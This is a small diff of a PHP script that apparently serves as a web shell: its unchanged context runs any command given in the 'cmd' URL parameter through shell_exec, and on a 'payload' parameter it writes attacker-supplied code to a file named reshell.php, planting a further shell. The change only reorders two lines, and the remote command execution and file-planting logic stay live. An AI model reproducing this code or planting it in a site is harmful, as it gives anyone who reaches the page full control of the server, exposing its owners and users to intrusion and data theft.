@@ -15,8 +15,8 @@
 	    $output = shell_exec($_GET['cmd']);
 	}
 	elseif (isset($_GET['payload'])) {
-		file_put_contents("reshell.php", $_GET['payload']);
 		$path = "reshell.php";
+		file_put_contents($path, $_GET['payload']);
 	}
 	
 ?>
